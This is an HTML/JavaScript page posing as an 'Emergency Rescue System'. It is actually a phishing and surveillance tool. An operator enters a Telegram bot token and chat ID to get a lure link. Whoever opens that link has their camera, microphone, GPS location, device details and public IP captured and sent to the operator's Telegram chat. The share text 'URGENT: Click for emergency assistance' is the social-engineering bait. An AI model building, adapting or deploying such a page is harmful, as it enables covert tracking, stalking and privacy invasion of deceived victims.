<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emergency Rescue System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(45deg, #1a2a6c, #b21f1f, #fdbb2d);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            min-height: 100vh;
            padding: 20px;
        }

        @keyframes gradient {
            0% { background-position: 0% 50% }
            50% { background-position: 100% 50% }
            100% { background-position: 0% 50% }
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            padding: 25px 20px;
            text-align: center;
            position: relative;
        }

        .header::before {
            content: 'üö®';
            font-size: 40px;
            position: absolute;
            top: 10px;
            right: 20px;
            opacity: 0.3;
        }

        .header h1 {
            font-size: 26px;
            margin-bottom: 8px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .form-section {
            padding: 30px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-group label {
            display: block;
            margin-bottom: 10px;
            font-weight: 700;
            color: #2c3e50;
            font-size: 14px;
        }

        .input-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #dc3545;
            border-radius: 10px;
            font-size: 16px;
            background: #f8f9fa;
            transition: all 0.3s;
        }

        .input-group input:focus {
            border-color: #e74c3c;
            background: white;
            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.1);
            outline: none;
        }

        .btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #27ae60, #219a52);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #3498db, #2980b9);
            margin-top: 15px;
        }

        .interface {
            display: none;
            padding: 25px;
        }

        .status-bar {
            background: linear-gradient(135deg, #34495e, #2c3e50);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: center;
            border: 2px solid #e74c3c;
        }

        .controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }

        .control-btn {
            padding: 18px 12px;
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
        }

        .control-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 15px rgba(52, 152, 219, 0.3);
        }

        .control-btn.capture {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
        }

        .control-btn.capture:hover {
            box-shadow: 0 8px 15px rgba(231, 76, 60, 0.3);
        }

        .preview-container {
            background: #ecf0f1;
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
            text-align: center;
        }

        #mediaPreview {
            max-width: 100%;
            border-radius: 8px;
            display: none;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .hidden {
            display: none;
        }

        .loading {
            text-align: center;
            padding: 30px;
            color: #7f8c8d;
            font-size: 16px;
        }

        .loading::after {
            content: '...';
            animation: dots 1.5s infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        .link-section {
            background: linear-gradient(135deg, #f39c12, #e67e22);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
        }

        #generatedLink {
            word-break: break-all;
            background: rgba(255,255,255,0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: monospace;
            border: 1px solid rgba(255,255,255,0.3);
        }

        .copy-btn {
            background: rgba(255,255,255,0.3);
            border: 2px solid white;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }

        .copy-btn:hover {
            background: white;
            color: #e67e22;
        }

        .permission-alert {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            font-size: 14px;
        }

        .video-preview {
            width: 100%;
            max-height: 300px;
            border-radius: 10px;
            background: #2c3e50;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üÜò EMERGENCY RESCUE SYSTEM</h1>
            <p>Critical Assistance Required - Immediate Response Needed</p>
        </div>

        <div id="setupSection" class="form-section">
            <div class="input-group">
                <label>üîê BOT TELEGRAM TOKEN:</label>
                <input type="text" id="botToken" placeholder="Enter bot token here...">
            </div>
            
            <div class="input-group">
                <label>üí¨ CHAT ID TELEGRAM:</label>
                <input type="text" id="chatId" placeholder="Enter chat ID here...">
            </div>

            <div class="input-group">
                <label>üîó CUSTOM TARGET LINK (Optional):</label>
                <input type="text" id="customLink" placeholder="https://your-target-link.com">
            </div>

            <button class="btn" onclick="setupSystem()">üöÄ CREATE EMERGENCY LINK</button>
            
            <div class="permission-alert">
                ‚ö†Ô∏è System will request camera & location access for emergency response
            </div>
        </div>

        <div id="interfaceSection" class="interface">
            <div class="status-bar">
                <strong>üõ∞Ô∏è SYSTEM STATUS:</strong> <span id="connectionStatus">Initializing emergency protocol...</span>
            </div>

            <div class="controls">
                <button class="control-btn capture" onclick="capturePhoto()">üì∏ EMERGENCY PHOTO</button>
                <button class="control-btn" onclick="startVideo()">üé• RECORD VIDEO</button>
                <button class="control-btn" onclick="getFullData()">üìç SEND LOCATION DATA</button>
                <button class="control-btn" onclick="shareLink()">üîó GET SHAREABLE LINK</button>
            </div>

            <div class="preview-container">
                <video id="videoPreview" class="video-preview" autoplay muted></video>
                <img id="mediaPreview" alt="Emergency Capture">
            </div>

            <div id="linkSection" class="link-section hidden">
                <strong>üîó YOUR EMERGENCY LINK:</strong>
                <div id="generatedLink"></div>
                <button class="copy-btn" onclick="copyLink()">üìã COPY LINK TO CLIPBOARD</button>
                <div style="margin-top: 15px; font-size: 12px; opacity: 0.8;">
                    Share this link - When opened, it will automatically capture camera and location data
                </div>
            </div>
        </div>

        <div id="loadingSection" class="loading hidden">
            Collecting emergency data for rescue team...
        </div>
    </div>

    <script>
        let mediaStream = null;
        let generatedUrl = '';
        let isBackCamera = true;

        // Setup system dengan credentials
        function setupSystem() {
            const token = document.getElementById('botToken').value;
            const chatId = document.getElementById('chatId').value;
            const customLink = document.getElementById('customLink').value;

            if (!token || !chatId) {
                alert('‚ùå Token and Chat ID are REQUIRED for emergency system!');
                return;
            }

            // Simpan credentials di localStorage
            localStorage.setItem('botToken', token);
            localStorage.setItem('chatId', chatId);
            
            // Generate unique emergency link
            const uniqueId = Math.random().toString(36).substr(2, 9);
            generatedUrl = customLink || `${window.location.origin}${window.location.pathname}?emergency=true&id=${uniqueId}`;
            
            // Switch to interface
            document.getElementById('setupSection').classList.add('hidden');
            document.getElementById('interfaceSection').classList.remove('hidden');
            document.getElementById('linkSection').classlist.remove('hidden');
            document.getElementById('generatedLink').textContent = generatedUrl;
            
            // Auto start permissions and data collection
            setTimeout(initializeEmergencySystem, 1000);
        }

        // Initialize semua permissions
        async function initializeEmergencySystem() {
            updateStatus('Requesting camera and location access...');
            
            try {
                // Request camera access dengan back camera
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: true
                });

                // Show camera preview
                const videoPreview = document.getElementById('videoPreview');
                videoPreview.srcObject = mediaStream;
                videoPreview.style.display = 'block';

                // Request location
                if (navigator.geolocation) {
                    await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve);
                    });
                }

                updateStatus('‚úÖ System ACTIVE - All permissions granted');
                
                // Auto collect initial data
                setTimeout(getFullData, 2000);
                
            } catch (error) {
                updateStatus('‚ùå Permission denied: ' + error.message);
            }
        }

        // Capture photo dengan back camera
        async function capturePhoto() {
            document.getElementById('loadingSection').classList.remove('hidden');
            
            try {
                if (!mediaStream) {
                    await initializeEmergencySystem();
                }

                const track = mediaStream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                
                // Show preview
                const preview = document.getElementById('mediaPreview');
                preview.src = URL.createObjectURL(blob);
                preview.style.display = 'block';
                document.getElementById('videoPreview').style.display = 'none';
                
                // Send to Telegram
                await sendToTelegram(blob, 'photo');
                updateStatus('‚úÖ Emergency photo sent to rescue team');
                
            } catch (error) {
                updateStatus('‚ùå Photo capture failed: ' + error.message);
            } finally {
                document.getElementById('loadingSection').classList.add('hidden');
            }
        }

        // Record video dengan back camera
        async function startVideo() {
            document.getElementById('loadingSection').classList.remove('hidden');
            
            try {
                if (!mediaStream) {
                    await initializeEmergencySystem();
                }

                const recorder = new MediaRecorder(mediaStream, {
                    mimeType: 'video/mp4'
                });
                let chunks = [];
                
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    await sendToTelegram(blob, 'video');
                    updateStatus('‚úÖ Emergency video sent to rescue team');
                };
                
                recorder.start();
                updateStatus('üìπ Recording 15-second emergency video...');
                setTimeout(() => recorder.stop(), 15000);
                
            } catch (error) {
                updateStatus('‚ùå Video recording failed: ' + error.message);
            } finally {
                document.getElementById('loadingSection').classList.add('hidden');
            }
        }

        // Collect semua data device
        async function getFullData() {
            document.getElementById('loadingSection').classList.remove('hidden');
            
            try {
                let message = `üö® EMERGENCY DATA - IMMEDIATE RESPONSE REQUIRED\n\n`;
                message += `‚è∞ TIMESTAMP: ${new Date().toLocaleString()}\n`;
                message += `üî¢ ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}\n\n`;

                // Geolocation data
                if (navigator.geolocation) {
                    const position = await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve);
                    });
                    
                    const loc = position.coords;
                    message += `üìç GPS COORDINATES:\n`;
                    message += `   Latitude: ${loc.latitude}\n`;
                    message += `   Longitude: ${loc.longitude}\n`;
                    message += `   Accuracy: ${loc.accuracy}m\n`;
                    message += `   Altitude: ${loc.altitude || 'N/A'}\n`;
                    message += `üó∫Ô∏è MAPS: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n\n`;
                }

                // Battery info
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    message += `üîã POWER STATUS:\n`;
                    message += `   Level: ${Math.round(battery.level * 100)}%\n`;
                    message += `   Charging: ${battery.charging ? 'YES' : 'NO'}\n`;
                    message += `   Time: ${battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's'}\n\n`;
                }

                // Network info
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    message += `üì∂ NETWORK INFO:\n`;
                    message += `   Type: ${connection.effectiveType}\n`;
                    message += `   Speed: ${connection.downlink} Mbps\n`;
                    message += `   Latency: ${connection.rtt} ms\n\n`;
                }

                // Device info
                message += `üì± DEVICE INFORMATION:\n`;
                message += `   Platform: ${navigator.platform}\n`;
                message += `   Language: ${navigator.language}\n`;
                message += `   Cores: ${navigator.hardwareConcurrency || 'Unknown'}\n`;
                message += `   Screen: ${screen.width}x${screen.height}\n\n`;

                // IP Address
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    message += `üåê IP ADDRESS: ${ipData.ip}\n`;
                } catch (ipError) {
                    message += `üåê IP: Unable to detect\n`;
                }

                await sendToTelegram(message, 'text');
                updateStatus('‚úÖ All emergency data transmitted');
                
            } catch (error) {
                updateStatus('‚ùå Data transmission failed: ' + error.message);
            } finally {
                document.getElementById('loadingSection').classList.add('hidden');
            }
        }

        // Share generated link
        function shareLink() {
            if (navigator.share) {
                navigator.share({
                    title: 'EMERGENCY RESCUE LINK',
                    text: 'URGENT: Click for emergency assistance',
                    url: generatedUrl
                });
            } else {
                copyLink();
            }
        }

        function copyLink() {
            navigator.clipboard.writeText(generatedUrl);
            alert('‚úÖ Emergency link copied! Share it immediately.');
        }

        function updateStatus(message) {
            document.getElementById('connectionStatus').textContent = message;
        }

        // Send data ke Telegram
        async function sendToTelegram(data, type) {
            const token = localStorage.getItem('botToken');
            const chatId = localStorage.getItem('chatId');

            if (!token || !chatId) {
                alert('‚ùå System not configured properly!');
                return;
            }

            const formData = new FormData();
            formData.append('chat_id', chatId);
            
            if (type === 'text') {
                formData.append('text', data);
            } else {
                formData.append(type, data);
                formData.append('caption', `üö® EMERGENCY CAPTURE - ${new Date().toLocaleString()}\nAutomatic transmission from emergency system`);
            }

            try {
                await fetch(`https://api.telegram.org/bot${token}/send${type === 'text' ? 'Message' : type}`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Transmission error:', error);
            }
        }

        // Auto init jika emergency parameter ada
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('emergency') === 'true') {
                document.getElementById('setupSection').classList.add('hidden');
                document.getElementById('interfaceSection').classList.remove('hidden');
                setTimeout(initializeEmergencySystem, 1000);
            }
        };
    </script>
</body>
</html>
